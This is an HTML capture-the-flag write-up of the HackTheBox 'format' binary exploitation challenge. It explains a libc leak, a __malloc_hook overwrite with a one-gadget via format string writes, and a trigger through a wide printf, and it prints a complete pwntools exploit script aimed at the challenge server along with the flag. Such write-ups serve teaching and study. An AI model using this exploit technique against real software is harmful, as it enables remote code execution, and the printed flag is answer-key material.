@@ -1,0 +1,93 @@
+<!--Solve date: 06/21/2021-->
+
+<h1>HackTheBox - format</h1>
+
+<h2>Binary Exploitation - 30 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Program Behavior</h5>
+
+<p>Ah, another darn format string challenge. The vulnerability is outlined in red below:</p>
+
+<img class = "small" src = "./images/htb_format_1.png"/>
+
+<p class = "caption">Figure 1. Format string vulnerability.</p>
+
+<p>So, the vulnerability is looped, and we can run it as many times as we like. To get arbitrary execution, we can think about overwriting either <code>fgets()</code> or <code>printf()</code> in the global offset table, so preferably after obtaining the leak, the shell can be obtained in one go. However, the binary is Full RelRO, which means that those functions cannot be overwritten. Instead, we can leverage the key fact that <code>printf()</code> actually calls <code>malloc()</code> when the width of the format argument is very long.</p>
+
+<h5>Obtaining Leaks</h5>
+
+<p>This one is relatively simple, in my opinion. We can leak the address of <code>libc</code> by simply reading the value of register <code>rdx</code> (the 2nd format argument), which points to the <code>stdin</code> lock. We can get an address and use this as a "signature" for the version of libc that is running on the server:</p>
+
+<img class = "small" src = "./images/htb_format_2.png"/>
+
+<p class = "caption">Figure 2. Leaked <code>stdin</code> lock.</p>
+
+<p>To obtain the address of <code>_IO_2_1_stdin_</code>, we assume that the lock has an offset of <code>0x1ed0</code> from the file pointer (that is the offset in libc-2.27). Cross-referencing this address at <a href = "https://libc.nullbyte.cat" target = "_blank">NullByte's LIBC Database</a>, we find that while many libaries are possible, among the x64 binaries, perhaps libc-2.27 is running. This is convenient because that is the same version running on my machine.</p>
+
+<img class = "small" src = "./images/htb_format_3.png"/>
+
+<p class = "caption">Figure 3. Identifying the version of libc.</p>
+
+<h5>Overwrite <code>__malloc_hook</code> with One-Gadget</h5>
+
+<p>Now that we have determined the version of libc, we can proceed with the exploit. First, we will overwrite <code>__malloc_hook</code> with the address of a suitable one-gadget, with the intention of triggering it when <code>malloc()</code> is called. Recall that <code>__malloc_hook</code> is a pointer inside libc. This is trivial with the stack format string.</p>
+
+<p>I would like to point out the importance of being able to programmatically generate format strings. Many times, with the format string "write-what-where" primitive, neither the address nor the contents are known beforehand. Thus, it is necessary to create the format string once leaks become available. A straightforward way to accomplish this (without using pre-existing pwntools methods) is with Python format strings. The general strategy is to first "size-up" the format string. For writing a quadword using halfword (16-bit) writes, 64 bytes of format string is typically more than enough. Assuming this is the case, the format string can be padded using <code>ljust</code> up to the proposed length, and the addresses can be appended. See the exploit script below for an example.</p>
+
+<h5>Trigger One-Gadget</h5>
+
+<p>When the width of a format string is sufficiently large, <code>printf()</code> will call <code>malloc()</code> to provide additional memory. In the previous step, <code>__malloc_hook</code> was overwritten with a one-gadget to spawn a shell. In our exploit, we simply print the first argument with a width of 100000, which is enough to trigger a call to <code>malloc()</code> and thus to our one-gadget.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+from pwn import *
+
+ready = True
+debug = False
+
+if ready:
+    p = remote("188.166.169.77", 31439)
+    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+else:
+    p = process("./format")
+    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+    if debug:
+        context.terminal = ["/mnt/c/Users/********/wsl-terminal/open-wsl.exe", "-e"]
+        gdb.attach(p, gdbscript = """
+        
+        """)
+
+
+# exploit
+leak_iostdin_offs = 0x1ed0
+#onegadg_offs = 0x4f3c2     #works locally
+onegadg_offs = 0x4f322      #remote
+
+p.sendline(b"%2$p")
+leakLIBC = int(p.recvline().strip(), 16) - leak_iostdin_offs
+log.info("Leaked io_stdin: %s" % (hex(leakLIBC)))
+libc.address = leakLIBC - libc.sym["_IO_2_1_stdin_"]
+log.info("LIBC base: %s" % (hex(libc.address)))
+
+onegadg = libc.address + onegadg_offs
+malloc_hook = libc.sym["__malloc_hook"]
+p.sendline((b"%%1$%dd%%14$hn%%1$%dd%%15$hn%%1$%dd%%16$hn" % (((onegadg >> 0) - 0) % (1 << 16), 
+    ((onegadg >> 16) - (onegadg >> 0)) % (1 << 16), 
+    ((onegadg >> 32) - (onegadg >> 16)) % (1 << 16))).ljust(64, b'\x00') + 
+    p64(malloc_hook) + 
+    p64(malloc_hook + 2) + 
+    p64(malloc_hook + 4))
+
+p.sendline(b"%100000c")
+
+p.interactive()
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>HTB{mall0c_h00k_f0r_th3_w1n!}</code></p>
